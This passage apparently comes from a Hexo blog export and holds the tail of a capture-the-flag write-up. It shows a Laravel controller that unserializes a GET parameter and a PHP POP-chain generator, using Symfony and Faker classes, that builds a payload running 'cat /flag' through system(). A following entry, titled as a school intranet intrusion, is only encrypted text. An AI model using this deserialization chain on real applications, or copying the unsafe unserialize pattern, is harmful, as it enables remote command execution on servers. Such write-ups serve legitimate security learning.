<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">true <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">truetrue unserialize($_GET[<span class="string">'p'</span>]);</span><br><span class="line">true &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="string">"There is an param names p (get)"</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>routes\web.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">Route::get(<span class="string">'/index'</span>, <span class="string">'TaskController@index'</span>);</span><br></pre></td></tr></table></figure>

<p>POP</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ImportConfigurator</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">private</span> $route;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route = <span class="string">"cat /flag"</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"> <span class="title">class</span> <span class="title">Generator</span> &#123;</span><br><span class="line"> <span class="title">protected</span> $<span class="title">formatters</span> = <span class="title">array</span>();</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($formatters)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;formatters = $formatters;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"> $<span class="title">a</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">Generator</span>(<span class="title">array</span>("<span class="title">addCollection</span>" =&gt; "<span class="title">system</span>"));</span><br><span class="line"> $b = <span class="keyword">new</span></span><br><span class="line">Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($a);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡å­¦æ ¡çš„å†…ç½‘æ¼«æ¸¸</title>
    <url>/2020/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E6%A0%A1%E7%9A%84%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="2706c09d50f1b81254cde7910bae439a8bf11e165a8bf0bcbcce1f1116625824">541ed2b57286a70f48aa3dc8388e3d2e4d3d46358ec5f2566a287e4d36f58a2f35233e595cba68e8068af1d85b170aaccb3cd36640260e5f6b6640d9da0e9220bb192a9753b6882cfdae737d326360af37d496eb657fc3ba70468f9c8aec91df79953449547c9a996f2a3b9a3b285b90713db3f1abf68067b0d79a367fcb86f8026664716b7815fdf99d7c0194b59fd579084b41ab3a3731903a55301c3e5f2980a4d921850604b107705e236e6b69a275949a063a2f487cb491133b6876534aab9353c5d69af8b521f8238d8d37fa950022dae7e95ef465d9cdf9d8b2f5a4f8d98c547e0f891f27fbe0e4e7d34d6875eecfad44e1f90249da751bec3858806615c44016c31f9a7f48e466be120e6749a3af560874876a046407dc3a0524cb4ab06ef695c65a4a382843deadc4bde04d5d72d0c220192d8aeb3a4cea9bb39a1fa1151c8ac3fd62dbb4af79d06c8f7b92cc826a8d48490a36ac6046f3679ab733fb3d5387a96699b000db9d4e16fc3a069b5610a837cb7748ee31a69fe5073785385847b4e3c815160eac23faf00b258f36b404cf3a58a9bae7477db758ccf479845509e514a28c454e1661ea361631b5d393953a7a7687081bb9a40ab46100f828e9d758f4bcd77a76d58656acb986d20b0da022ee13a33ea9c7cfb14bc28e8606855146559e9aca77563fcc8deabbf2fe3554f0de5f749b6511e63933225acbd43cec9edf4ab5f47c12ba54ff4e649752a1d2489856904be15adfded049a0f6dbcda5aec4c6939b852ed2c59c06ce9fd198a905f499b0c56d85dfbd91d857f76b00ac807d3748f6e3a5879bfe157a5c40e4d16ed4bcb16085ec8d12841ed7ee49c642173494b5868a182fa349e52cb98f78b50afc7beedfafcb361bcacaf7918f8b66d2ba83797681c2628c432e2c86851386ab46cc51250e375805140d2bdca56e77688683c225bbb9cfeb111fb94c44a3e850cf0f6ad4650ac28a54e9d59a003ca53ae702ad6934f37fa9e976e76221463f2d1ca4d4217255621fc49ec4219f7e04d9dc050633fd608df93b6f70dd68fedf016eec992b1deecec8a85d00154f1cdeffedd084603008d0d72a8cd6b42942b760c38567f85058eaa79ee1834ec9992b3e92115561e42f5e28adf6dc5c7701f70970f57468b4d28db570166e9973f573cedf083446a38b8a22cf5cbedbcb1519167815662eb706e5f07ba8592ee42e18a69fa1b883ce60cdbed61fdac158bfbc0afcca50c2c0620c19851769ea7b2bb7fc47f7c4c972dde04510348f1f525e04ef6fcb5b0ae8b9563dbc6667c39a497e47c616f5e4f29f413443a5173e65c2956f8ccbb668337279952acf8551b0f06038bf3481068836efb963f373e294e15164ef29ded3188f1b50e62d3564a880c3233af2b970f9b51a054fed3f5ab73f058181db95c7fda2a660ac5a12f5d49ecff4bce428dc98cbf82723adb0dc3718f4990712d7ea0c7e255abf660393a878d5539604c88806cd8ca727718739d27e6a6a6fb0d410af4eb24e9fcb8905e1eafbec35dde774c4ac0531b9d728f4a627cc68dd69454208e926a3c5d027299353ce697894a4c1c95742165010fc16e9c4a657bddb311d3261c91718f9cbcff4e8e1fb86f805fddd3d6d52448982c0e706e7c98ac4c124080c59b318b624d22dd8bd3ab7fcd4880f4bef6784f9954994852a47844d162029888fcb1e3551d3b25803f0fb1114ee1506ab68674f5ddb7c652855787d32abc645926e397b175ebbaa4a6d24fd3273dcbbe6a0afba12d47c83998a78c648f2b9f2f01628b06a04e26c0a8c19f49ca6aeff6f35544d52c2deb0c033d5f5af1838b21ffdc0c2c2cbecd700696d43899fbbedf4b2f6a1deb790bf5da1bef09a8f9ebb9d80fb6b56ae383a3993ea95db7359a811eb347fc9ca773c8b83ad2faf8a1a73c0ebca1cfd73391fe7f87b3d7d9f108080713db14de35467614e320a1eed2976aebad516879f6ae5e595c99444bab112452d339260e010f643f29bf0146309eadf88d68a4e38accfe86b55811488af25d107c4c1204fa379b24f99702a6cd53a67b3c241e2cb3231bc493ba3a8e3f446f4e009496ff1204e3d989ac62e43b90c2851d733561505f1c78d1200facc665cd9bc4f206a51e89015473505df59c9d6dbee7d3bb8fde0600b05e69c4c24208ca193e7519b28e6169681152c3e90c294a11366ce58b868f35d0d4c510c350be08eefa8514313f19fdb82a5545bd12ca81f4455d0cad5012b7fcc43b18bec1768ccacaa8d3b30bd4faef4da853e28f0f6cca2adde21c235ca2e09858e62a7baa2424d87bdd188d9511639e31a0b9e7ec03682daa597c082e90db8f6c50a1a6af87a81afbf98dbaf20c5b79539c7f1745662fe14221c21d870b15511afe050a03e08b255061f08aea277ff29ba5b0791847719d98b7fa51e61ede28902a32608590c6476b6a439f7827f8b2f08cc6422e5edc1b912489cea9f86a9747f465ed78bf356e0d9123b3d5d86251f8f86138c872533ffb7444fb20f4949ae0ee55cc5803ce605c5ceed80712029b3b9ca96d58e0099b80551ce2d0eacdd8bb3d3874df9e12c2da99fe2e0307557d80d3b8d17ad30d1099bbdaae42c1e3e222fe88303761e8303169c44d2ae6b3f785ce78c9fc120bc9a7d2e271e2f1162eb759e1d4aa568f24bbdc6925d9734817bcb4a745da148de6ceaba382a6bc33ece89c1cd2ce591a264cc135ad3bded7d211adec39a8ab826cead8c774bd294565442db97e8130eec9288f5e34a1b0925355468b70d06a3f5ad98cc47f780b03b358be64c0d3dfb9cdd68d563209e82e54db078814bc624c11e44ea684702ffdbafbf3274f57369f6f78c59b79c3b5a2ac1ee4ca335973d90aef55a9176653cf8df78a99b312c20c215d4a9f832541c72b215eacb00d300a3c5441b21c8504825b3d0695ade700c20bf4e0a7c82e57e404a29e4111381ed4a1d5cdacbbf1fd3ab4444be5c1e883f500ab45772c9900861f6ab993d5adeb12919d1288642971e97e02f1886a2a0d940648360b79809f069126f29e3ea8a92de18a93cffa2b743bd6765c5c6a7863144ce7e8aaa13484db817768a77e95d49a13788404f20e9137a76cac2d1bbd978572b410b0dd9121bccd14d0a10ea682cc5dd02fee3c087a2f121976a66fce40e8250f62c7ca27916c0f2ac78b0b58cbafe0fdcf47bde99f3f295d27779bd87406bc0393272f20e74f5cd363fec8351de20b86e88da7487d5cf16bf3d8f2d7471c93cb9731b2c92a7c9ef485000cbc4d0eea8de3f8878cd38f6e12ff2a19a92f66696b85d07f638d21b119519c33a6401440e52635828e63da276a2710076acf7c535527f0cbeea28ce3d853b690bbc7cb668ada48406c1c14440f0a7d93e8af275a7837df087f0c123986347b9e87f76d15acc66f234bd176fd32417c0f0c2dab5c99342cd8d6ab01af6dd17d255e280ed3b1642d5dce4da26650f2db53b5702a15cc9e62ddbb4fbaecb276f7e720bef32bf734c19f4cb711a4de505a109721f17e60a5cb08ea2a4f23918f2a1c2434739cb3c3a61e6377c2402af5ce4f4fdac5b9ce343ae7b9c6417953aefcad778d589f2fa79a6e9b663f2869a87b417ab2e64fca28754f6972d1e2376918fda6865919af8e523bb22d3cc3d88f7d1a843e89bf1baa11cf5e66f2ff0d3c5a141ef06e3f12ac746ba6cb4ee84ebd9939c9e327c0a1d70496cb465082b4358b1790d88c96324960709833aa3c51563a50319fee2557bc572eed0de803ecc147a9b09326ad6805caf14489b9323fd58c5ca5bd4785722e82e901a3878e936e0bf60d4f401147c448fdf2237175145139a07db3c95acab0aa89d4277ddbbabcad5b1246471118652c42b5d4d3a38a8b4e90ba2c1ffaf82fcd458ab5ecd5885fbf4d98c832a6c115362fdf2c244ef242a7d0949b6e6d067a78ff0b79f34fb9e448605bc4f2bb33532e19ab4a13b8070a1ba806b45bb414fe07ffb09b4876eae28b1a4accb633f7f89916738c715d9ae3aba5ddb653094a334fab8badc9a70f44cbcd6da3a3b3f2c9af933a835dedb6eda49c43df0d4ba11f27f131bee8df54bb873dcb5f133947c55b723b007ba6571628aa284b3551e413ac9d3f483de16cf3a8971f02e82ce99ca4a8700241b58980561c4a055f0e1011953923a7b7f1b10519e6cec385f2d3721e268e7e2222a52e17bfb7a6ff21d9921609e3d2a196daba67227951d784651d17542902efa704d4812cbd5fe2dbbd5bb3910fde8119f8534ad1ae5c3f2342c1d71d40d19785f6fac796cef8f8e37f29ce2316b83b8be7ebc757c0995033997d019aa170b81ba761a2fe41c6573d056ad5e63a2fb664384d3ea36f2f88a3afa894ade831561d518271282851a99c65d3b909712274b61df1adcbfabd49f50dd9522c6bca000eda860d220e23d92f4de6dfb903de2265a98cc8230c828f26764c8ab0e05bdfd1948aa48d158b6d3d22caac048451717e41009d513e8bb8f30638f8d91c5820c0c4f9144cc0f92853c4c6aca2562fb74d31780703b51f8d5427690fa9c6ed3831396f642cd0e3aad1e292533ce46bc34ed9aea811a94bea90663e9f4f9a93d249943a8569fe92bbdb65bd3fb6c97cb96636c1dfeed62d7c7b7a58ca7c843790429f88540fd7d921a28fa8d4dbb92352c1087ac899af6a829f7a9e57dcda28a438f9e99c4f8e214763eca9a075b1f78ab54c93c7d708c4a1ddd62231941e116a9c156850b55d5d922f3bed6b627d6e13b24ee950d45fa3dd5c86b032872e7cbb687031403658d2a54d1a2ebffe6d5b52976951ede03c50fbdec803c2460879dce7b08211ad7b23a043cef00751bb030f369dbbea931ec3dd71d4555b8c391e59838b10e5f3b85691526dc8adc935b824f480a88b3b59dcebe3a850b7e383d66afe3841d88c8c765b00064735608d01b8b1ffd31f91a7b098d9a96d7b91d73faad4cf5dccb04cf356cec916e34603b1ba6f9b79760111567f16984748608227cadf333b35286ca3cd3caa6043b141e8313675953c7ff56a44c48a7d972bb3f8fb0c7ad1dbe5b59ed96254a8ffb726ce488e85be3e8a4d24ba3a5db74e441d982178e25901a6052c093dc6392e11f4b00a3cddc16ad14f0083b6b5026757117f2133362294db5725ba5a535bdcb7a723f1fa2b043c2ce151f19a105e90028bee34f782681332ece055806d177b9f4c78186ce56bc00dd1b6eac4d8a6c00cc322ee79f36742e03bf63b993d8829ed1bb6e0ada8e4624b8daa0e04909303d746d64e466fe7d0668b23d1ab3939bd3bf01b15c96b21d9904b8ae2658c6c6fdd0a332ae2667ee1766d6f2e7c52ccffa7d9dbb520492a289076fda97f34a61cd10376e377e0fbc5314a7e87256afbc946b5660a51748d9a29a4d6cd394571fa402a1b1d6be8cbfa5d473e400c004b7d24bc72ea58a9f6211cb2dfce970ffa04d201d64fb1f1c0daa88d123c89b9584aa67628e569cb79283e2571582949d9e9742ef86faa2abac2626bc539137dedeefef6e52516ae89272bda0b5fcb321a2db4d0ac337f0c88d7660476e5667b8689eeea20a5b03c0fa7d8d8f5cd76405afde16f971a528438e341967e3ad59e2235e513cf76186a295e6d163c04392ddfdb88caff30a88ce623558965904b8bbae4178f2ba95686d8672fc174e91e584665a658b7e348608e9e6a6c40174a79464bbf0cca5daf65fbc1aa3c3fa4392708f1023305c47ed37e8461e3e541fc285e17e3e312065f9ae8997c89474cb9762a3f705775c80a958d1d26bff21d6593f5c21ed3c686680ed9f454c14c6ebb6add468b21be870f840d41f52227e04990782bca30016e39975e4595e075087b103da1cecc816dbf67469aa3e408274275dcffb2c54e83d21c23c6f107f7fe6767abdad7b06edd96ee935c664b9c421bd9b087558803494ed68c2ba8f1cf95e74eaf44bb1145a728194d85f665824fa0102ff8709efff203fe2631cb1a426cfbf36dfa14ee4925cdfe988c7e7aece14fdf02170a973b5b59277332356305c1085ae660afb10dd808fbceb73447bd45c033fe3c1a6e339275e39587d4922e8929e03a34f736143c6b1f7be1f6d2df008089ff33d67ef2c1d125a5ce973d389d584453562ed0ee2735e5abfd8783d490a915fe8d520ac8aa38504a047729d98833604220ad52a41e2b986c8bec7b1b89c56fba3cb4a3f0463dbfd521eda4ad8992751ad7b18f82d259bccdca5a0b7ae162c6b934cb1445a8b2c6f47cf79b99cfe0441c34aed0d932efd3db69d90541f403a8a7d4c6ec4b650251dd1bf3fc9fd043aebb06b2d78c8aefc32b8788eb4491c5fbd49c79b0d2ea5742f49bb49fcfa1d552dcd23078e906c12a0b3095aadc90ca43a19b51bce63f81b80b6e5b58a1700814a9f9742c9dafc9864cdc655e13c339f3cf45df93d0d0e8fe01594ad710abcac7940d655f62b3319f81bea6fed0c40ca3643b12f6f64241f1d5121677f678c0b96671f28ab2bd1bafe6f8cb7f171606c892b749e44e9525c9b0b567e81d0f1b851b550ece93190a37aa849fc91a8b032dffc48377beb5bfbdf309f35711a37ec960c479fa5a05d72e77facef6c8b4b40de0fb48755c6e50ee17288067924f0850c42dbcf2008461ba238df9b0939633d788e6601d8e3c7c2c0ff1f4c6cb4f4d0418f984293aba52cbc8791d2212cfe96e7eb58165e971f6214e51c833c863d1e1cc3ac3aaf6b223682702ae76ef3f9eeeb7a3eb2c041395f5aaa2ba7d8a38c8c0611014eba37fafcc9947236a6e0fe93c50c31b8c4ec1f9d9316180d6d59ac5afcf490edf76d469f31f63413299f73dbe1af0aac82bd30b2dadce08d5ce1d565c83a254a48538b432c50660fe05bce26f79221796ec84128f0ca97138bb0a96abee9b38101699c2af75069b14755658f7f7bc5bc8cba3adb79e76db70324e4017bcbc6bff18e65db99b8f53fda29f65a46ff662628680b4ffc287b9cc08ae86d980d793b700fc0faa6570538f543c41ee6bdb5ec7dad6c852965971b4515590c43e5e84e227ae470f583e9e53ad402583c9de8123d940baebd57d2b4b041c017fd13d8a44a713dd9bd42a6f8366e66c8f8a82a4c29714cbfc7f31b5766fc5e49be6c18d0c9c9fed42d8777b583188d8665f57ad291c24476af2f13ae341b76725625066709e98f827d4e64582bcceaffe78f755c08a2907631df020845f454671735b77af2c3f85fed7721368f028ba5dde6d188655784e98b051b2af3557cb48be21ddebd747cce62ff17e37b0f61f5106a8feabd2b959283a61500c6130731e8d0ec61cf4da791569c288757557786d8e63022b73dcea3b0eee4bb40e29757ec88c4a5b9723b0720f8c721f02e9ad863c426076f69e43bee19d2a4aa0ad93784108c2b6f5e513dafc6a7734476da385b125f6453c37df3dd026397dcb11e31b26cb5fbe3b2d00f31ed72e2eeb5fefa3ed581d2250e9f5cf0bb588142c0af8c0a45bfd4f85be59c2ead7e676bf90c544765d08d3f2fff50625b8111db7148ccd842c79c142da9d4c87e3123637292015affa339b8d994b6cd0ec8918ead85426a68ccdf3aa853510bd03334d8bbc46cb5ea3ad9ea9cc1c0394ad21074409be8a187463c0e7ec2eacdea255525362779adcdc40e8630a71c8526f574883a8939f515e674a54c68f6f89d2c4c78a8e99d38b099f07ff904eaa484de25bc9f76c685e07095c51e93d972562ed3fcfd0edf0c7f3ce6b723bb027156985e1c3a293345a646604402c8573a752f6cb38a7745afccaca5340ff649d9da1a15a3e5631197712fa02134b75c6607c7447d95fb8ba6b93085bddb3ba8124bcfdb8cc1026f67397541f55d671bce2464fcf531fd46ad63f859a2ef8ae389f1e0527c672c22a05f8e604e47a23373cbd30a88fed0b2c551e12e615b398f1b8c1dc02d9a37c5f6df4c68e19bc3a54b889a4f4db2698983a61ad1b200d9609b7c25c7beb0efcdc5a62f0056ed5c6b4c790879c747a2cb89a1b06ea2505ea92ff0dab8be7c66a5f7fd2cd83eb131d1d9c9bd7c3a74a01812237d5062e5f9cbf0f92bcef452fef30a904de14bca2be4736f239680021f6749ea6994db4a1e245e4508e731e89fee7a4fc9ce28342203e840d72452e1793b7470329e42817199306c6cd3333929b85e688200272a6096d98fa099675c199c51eb3b733a73693675485f1ce96b61ac801cdc5281b01ad19e118c1de9e55fce9dd78ee3cf553f68bde532ef2c967ac9d0d2f73dd575e8e19c09e3ea449b52932441a2eb03ccea98f73e503d01135da21e7bf0a73e69ee1c606b45d7d42a6d177689eab84d083f2e174a08533c5dd24fc696ec1cb41597024139b823c46e5aa1c342d4c2ede537b69b2fe6404278f3fd9fea48f41450ecd6760a003e36820a34c208712a3652e7e87c8f498b2eb9850346d64dd7f15324c434ec4032b9c14e483f9cce2f2e6feeb455657c4d546be5d87560b70a3e2c44fa2c95eb46da253fdbaf56e5f51308884d7a190f934b0565031f7e5f5fd3da823eb7be34ed59933d830376f7b06242a274615a84bff0c504fa2699cf4d7eab137ecd1d5f4101deb46e06612c97bb8c2ec994466dbf78dd45770ed27be27250c0f0610723e90063b0825f2265b93e29d56e26cb03abf25b0aec9d48824f1c2e6c9973784e47b3dfe24c86b0efdff9d186f989664bf71cee8d5b96aaeba1215edafa09efa72d1d303da32b641c57ce2325d28badcaf68c7b7ce96f130ed3e2cecb593dc2e4cf724c048337e64ce21230745747ad60b1042cee365f01b119000ce7dc96d0b5a14106c831004c2d9d3280ef4d97f2b3bacc62c2ad6af315a8f1a0c722e38032bd3051fefe7544eddd67b09ae178d51a9dfe2d7bee2e09fe7c8f4ed5d53d3cc79eb4288c23ca9ff3cb4a0e6e502c1feb3a852154b39ecbbe2e4dc648c3f2553c469fae6bc6005996b98418b5721c6b1d5b11627436c9b0656cfc0215cd5ce1fcc4ec35baf7b2f6e0a291851800646df24484b02ee0272e6086a0c3b6a3ce6c3a0b9f57e4dbfa2ab929b22cc5bd7aa0769b23324921a3976abef430a496bcf27514285d34f42814f9030763031e5682e26446f01cbe2456146257b525f0087c09d6ed1f9884807f886e016d6833004bd08a159058b4c37ab22120fcafda1b8f11b9c786a937fcfebf9c5cea336a8d06fe29344f6c871506d6ae6afd15d62fd0fd84def56eb2b0cea52e82293f8ea03bccecb190d33c69e7a2d93f1b21305e67d6dd7e72d50d4c633ce4d2d1db22880b0b6c5351980380b601b0c64bd658680e84e134b746d2e9e1e288b950dc79a94018b13db774ed1656b9671ec067cbbfea145023979dedfed2131ff8a73af21b0a6f08c07ddb63b137d9bb0cef4df4600cc98a6512212bff86faf3f3b756c96a64161d681ec553df4f76a800da45a9101cb84f8150ba0a9dcb18aa0370570c7f5dc3ac6240500226a24501ab6ab74bfc9d374a48780edea825d53c013f3972228869dac6f792ac83d6d5c194ce99f660a2ce9d95b86ab90ccf25b22633f69b8c3f6d1262ea8ef91eaf197ed506ddd305b4eb18b460dc000e9855d86622c507d25a20189c036bb508b9b9c57025b25671b22bbf997e8ab303c447912300cb4033c151f9de18d04c63a4140e812a7985c846c5a0acc6eb9e2a760029f0af544bccf111a84113168199fbcf1a78f543bf6edcf3d3b95bdbc495581b37a5ae06422d1ef72cc54e7354d67898e2ce3a2439ec21fa6159af9ef4f61a72c35bb610741aa83cb09d64b1341d9f2e35092cb08c1d5bf636d78a365986066c28ef0116d549560aee60443f24f0d296429f6999db0e8698e41c86e84afc628afc9dd1c3b56f4710439cc9e50c220a161b50dbb99241f1de17d8ba123c274fb4c5af66c9f684a51648fd89a1c8a59c78d54f82eb01c2ecdfd090f06f30d537136e29d43b016c01a8e7ed3ce0c7991c31b600f2b49f853c4092ef241fea254b8b58f07806469dfecec6372c6cfde41416bb32e663f6433696ea4407ad0d3ab7d587a511ec6861794d64bda2077540f911d748c702f237d921ada24aa780d0b6fab88d5c9af806bb601be98ce686aeb4ade9f781e3bf83910e9462bd3b4227b9bec1d4160dc502f64b8c8e727a0d169b940c1c3389a108dc5cfadb71f444aa799cdb490cf7caff2e46416e2e77fe2733b7018ada152bf5c49cea6a8fbf1b9abb24c3ddaf5172714c7e4a65a071d8f48f3d928bebc92e262f877eb544875b7afef33535baac26482fdac205cb0a451be024ac509021f95e76b3d030297ba9fc984191ebaeb1d7193f982a649bd81fd35d9270f9d5aa7bfdf94f98bcd8337e68696185e888f143c2c251850fd3e7c6027837ec7eae86a7816380c7516ee2398d3974496f31b730ddbf009abcf4440e0cbf00e0c40a0b8820fa254bd9f0b9d0a84c2851d8aeba9dedd6175f241c07149e14f6ec7b1c25c9bb6378fce88c08790458ed405ecc9900c0edd6055d15accbc22c733e0b587d4d03ebbb1af88d8967aed1d10dabede69b2dee60987f8be66b5ffc2c44e562aa7e26c80c7786e570712ecda58eb71ce777c021e7adbbe46d57c9553befd78835af7b7026a9b0e1973e88b374f8317f65b2d0bedf3ddee6bf12b16aa83fc8b54187cde2a86f346a8a6524446688f0e7d74bc922037754aee4039c1236f922d1f229d7520d979708a2d93fb004853bfdfe98e8869825ca82c3cb89efbb56d0b887193719c6c3e1a6f75f5d97484fdb15cc4fda1750e45302ce7bdde763ce47a357feaa1190410c27377a6566b87d6876ec0e47e7bb62453690972c2d58ab44cbe724c4ee18e4c973459eb28abd569e9218798c18af6ce74cf678c28a1944cb573ae9830e47445b9f470f08fe2e6738ccb396ae7d38d70ffd11ba313c9844e7d0a2adda835f8fc2c2d9cee280ff7bed151599336414ec1945a76492de06c66b994c7ad197fb7890b2208f073f2599863cc0cecb48e52a7ef887bebb4279bb69affc4ef517a8aebcaf20175abe93324207de08bce64303dff5f87efd7740921e5154631b485cd088238b70665c70f203d2055a56c30ef93f85ccd2006faaf71d6c59ffa752da6129aa7b163605fb75666aa90e2bff9d7a1212ebd122335953777f01becea5b7a4461e262b91c4965172f6a07dca7903f71c88371f6cf8e9255c91977c17386117e96d01aa2c43d9d19bfefdf8de7f7d2ea6fa859dc963968e9185b52dc8e8ee2c4638de96989e174969395372efb9669999a7ee661df26af58020ad69a8da6f4f5e0fb234f6ed425dfb6e8462e703c04c5b3ae5399f08073b1bd625aa8eeb07451640ecbec7613471e95ec30002439092e44441fc30e4becb7218674a13abed9c0576b2b51368a3a217cb22320ad24bbb074dbb450c5fb3d4a76c594cd8337a6c8aff8c4028b0da9e1d640d8dea32093fde084c44197d0217b77b1531b39607a04fc0d461693fdf62647e592144568bf92b45ca8fe1cc997086dfbe23935b39b0153fa2c16a59a83cd56fc95a488fce9979ab1f08b89f45312af06f51a7e9aa87d66c84f6d06f98d38a5fb463027a605b544b7d6d1cb39dd9548b13fbe42c3f5c18e8d4f9a617aadb6357fff8398094072dd76cb1913862c61ed7ac19e5fb7013f213b14963bd96eb957bbd744a8d959b80483d785a179f9453935a1b335c21b56920a771b61e0553b5d77d75c21cf0148744a86b2f2c49760f11e5e29c02a28805a78cb4b1f895db0c53f5ee6d300e1a32fd9471ecd5ffc48f9741cf20aeffb712ada26cd268a6478d256d4752d8a12a9a81de87c4a97f0a58c957ef3f694017548881cdc267e773eb6941d0222ddff4e0c6e00be64ba27b18f63363a059308ac47c7aca19013fac13dd1bb9fb42dd9807911fd2b08b88f1bf87cb6444a4d7e75cbe6140b2c607abc7641d7715752ddab4ecf712632dba599fcf24b5b3bd64f0cf8acff9a92b0670cde10cdb4d8618ca039b2dab0f5d86707dd31f1a088b652d6b4d5c4ee7670c369716700ea5dec57d1416dc1f16129e630de34a5162240480ae140aeec3f6bc1bcbe4ffea20d3d968609647b30b1656c63c68ba696e9c63932d6addef8656c892e3b598355f84810696b5b20a5ee660ebdc0f6562bbfbf77dee812c53d72678853c6251ece715db6aefecc725bfaeb5da9ba2868b29f2969ebd230e891be32dec2bfe8fd340fd0b7c455ce83001a89903eb5122bcad67bfa9f79d11c1ec1190c8b968800295ab94b271e4556f15067189785ddb1e0a4bc40f9cd62480f03aca6676c4d1bb579e41d4a4748dfc71b2afb55c384c0f20218c1a7d3a39cdb9eb33f9461e14b5770608ef0f3bc62eab6f7c655f983898a013f37d18d72b033f186c27e5374151bf29676cac973df510dcbe67e1f5186210df771f398a11699b29e5886f395e08191b28f7151e26e448ba1e93ddc4857f5436a548957ff5c8b0fdf82ca6838d5aea2825393852c0e27a65e553a95ca989282c71a29ffff429f64c3b6403dcec6e3cc35ed7915144fa955331432c2b16ed0509ee29df1ab17a4840484218e532ce5cdc54ebc5b9b93e5376a5187962ccee323436391e2578885f005619562b5551c1104a0c0bb74c3a1fe3c25569602f92ae9cac2e8fd7f22354ad75877ca2e14ca2fd1894742c6b721b4878cfa0784f64e9615208becaaf8327c94c72a757461ad4faa7c3f8216c0585a930f0069ec6e6e6e0e716f6d3eb140f919fc140e0809098f7d778f583f1d57dc3b98b7fb6ecd3fc249a8593e5c92842d401484f29f87e7c0f73c46d3852796037cade91c653a9db14633d207ff5be60a5abbddd67f4bf58fd99f4080e276ad5648ec0d78d450ce0ba42a275439cb972f4481cde92af62af549f9f47ebca45228085fa9ab165be414053fbeec0234f490f380bea7446864eebf98602bb0efe97f40f2dae8046559b183e1bac021ee0f226266231495c03cde8102d047ed084368e4bd1f8588f66263a66fb915a8ab2638082ddc89da5c383dc17f1db698c1b2065eff7a43306f3ec20c0280b887439089a9b9a821a47eba14bb3e515b5e1eb977f2cbe72072ab7137873db4c776af0cf10e89708bfdf55e9bd2d14a9aea50c5481ef80f9708a70c234ab3f9898a107c1cac4f3de88ec08a6a9b4a27db6c164acf26d290e60b70db821cde7dd67f90aa33a72259133127a2f01b19fc5a221c6beb21db2b4a13c4021d98359071701fce8e8beab3b67bb0864379d2034db9682d6fb38d901c861016703cc0a61c5be91b3f4fcdccfda40f3b150e38eb3f930c581ffba915bd21b0aacf465a5ee15ee94a087f4ba07d87aa1d6a18eec2657d213ba6f679e90935406ddc5001725f44fd25fc063b25a95244381f8598cdfb2706ccff450b6bba0273d190a4f852329dcd4ec404e596cb4bad12d461c27f526c940345e40a17371dbc244b48a7a49060fdedb218bb48de5cde384cd72ccf8296e9c26974840bef7172b5008dbdbcbea4d8ff2e394bb3d544752119face66a1136b8972bcaa4fe22fabb53d8fd7fb84116eb145debf48176921bf75e04ed99d3ea71c2f7f292b62ce8332767807da23285454099ad3dbb37b74f31796d2b412ee504fb0ca60e21772d77ec300b7ee56c4cc3211b61d0f51f988545a7ca2fc6cb1cbd0119bbbd223ff6b4949b0a844808fbf75794e7f93c0e0367ab5f8a71e43c28a544806e8dddf636141b9eb353a0bb844fce48ce6c5a464e6c9e64a4c5a552e3028f3b5d94c1451efca51195471dca86ade276ca7bf8bf358f230a06ec1482865eb1447190ff1db4283dac5fe02c88818f695af8e1e8b99660cdeb179e33105f6e7a32d15614e7be6705c25b7a1d65d7cfd014da26d63674012bfde01e124d5c8b7fddacddefa